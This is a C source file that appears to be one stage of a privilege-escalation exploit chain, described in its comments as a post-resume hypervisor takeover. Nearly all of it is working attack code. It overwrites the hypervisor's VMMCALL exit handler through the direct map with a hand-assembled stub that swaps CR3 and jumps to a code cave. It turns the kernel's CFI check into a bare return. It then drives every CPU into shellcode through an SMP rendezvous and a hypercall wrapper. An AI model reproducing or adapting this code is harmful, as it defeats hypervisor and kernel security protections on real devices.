/*
 * Post-resume hypervisor takeover blob (runs on the BSP in kernel context).
 *
 * Entered after resume via a khook resume_rip redirect installed on
 * SYS_GETUID. Arguments:
 *   rdi = kernel text base (ktext)
 *   rsi = direct-map base (dmap, i.e. kdldmap(0))
 *
 * With NPT already disabled by the pre-suspend break_hv payload, the direct
 * map addresses HV physical memory.
 *
 * We must patch the *VMMCALL-specific* handler, not the general VMEXIT
 * dispatcher entry (0x62846c00). The dispatcher is entered for every exit
 * reason (timer/RDTSC/MSR/NPF/... while NPT is off, RDTSC and friends are
 * still intercepted and fire constantly). Patching its entry hands the very
 * first unrelated exit to shellcode_hv on whichever CPU happens to take it;
 * that CPU then sets up the identity map and spins for its rendezvous peers,
 * which never arrive -> hard hang. Patching the VMMCALL handler
 * (jump-table target 0x62847375) means only a deliberate VMMCALL diverts.
 *
 * The rendezvous action is the kernel's own hypercall-4 wrapper
 * (ktext+0xc09e40: `mov eax,4; vmmcall; ret`). It sets RAX != 0x17, which
 * matters because the dispatcher fast-paths VMMCALL with guest RAX==0x17 to a
 * different handler (0x62846cc9) that we do not patch. Each CPU runs the
 * action, VMMCALLs, exits with ec=0x81, and lands in shellcode_hv. This blob
 * never returns.
 */
#include <stdint.h>

/* SVM VMMCALL (exit code 0x81) handler, target of VMEXIT jump-table A. */
#define HV_VMMCALL_HANDLER_PA 0x62847375ULL

#define CAVE_HV_PAGING        0x100000000ULL
#define CAVE_HV_CODE          0x100003000ULL

#define OFF_KERNEL_CFI_CHECK  0x44e5d0ULL
#define OFF_FUN_SMP_RENDEZVOUS 0xaf94e0ULL

#define OFF_GADGET_RET        0x291232ULL   /* bare `ret` */
#define OFF_FUN_VMMCALL_HC4   0xc09e40ULL   /* push rbp;mov rbp,rsp;mov eax,4;vmmcall;pop rbp;ret */

__attribute__((section(".entry_point"), noreturn))
void takeover(uint64_t ktext, uint64_t dmap)
{
  volatile uint8_t *vme = (volatile uint8_t *)(uintptr_t)(dmap + HV_VMMCALL_HANDLER_PA);

  /* movabs rax, CAVE_HV_PAGING ; mov cr3, rax ; movabs rax, CAVE_HV_CODE ; jmp rax */
  uint8_t stub[25];
  stub[0]  = 0x48;
  stub[1]  = 0xb8;
  *(uint64_t *)(void *)&stub[2]  = CAVE_HV_PAGING;
  stub[10] = 0x0f;
  stub[11] = 0x22;
  stub[12] = 0xd8;
  stub[13] = 0x48;
  stub[14] = 0xb8;
  *(uint64_t *)(void *)&stub[15] = CAVE_HV_CODE;
  stub[23] = 0xff;
  stub[24] = 0xe0;

  for (int i = 0; i < 25; i++)
    vme[i] = stub[i];

  /* Disable the kernel CFI check so the raw function-pointer callbacks pass. */
  *(volatile uint8_t *)(uintptr_t)(ktext + OFF_KERNEL_CFI_CHECK) = 0xc3;

  /* Kick every CPU through the kernel's hypercall-4 wrapper (RAX=4 != 0x17);
   * each VMMCALL VMEXIT is diverted into shellcode_hv by the patched handler. */
  void (*smp_rendezvous)(void *, void *, void *, void *) =
      (void (*)(void *, void *, void *, void *))(uintptr_t)(ktext + OFF_FUN_SMP_RENDEZVOUS);
  smp_rendezvous((void *)(uintptr_t)(ktext + OFF_GADGET_RET),
                 (void *)(uintptr_t)(ktext + OFF_FUN_VMMCALL_HC4),
                 (void *)(uintptr_t)(ktext + OFF_GADGET_RET), 0);

  for (;;)
    ;
}
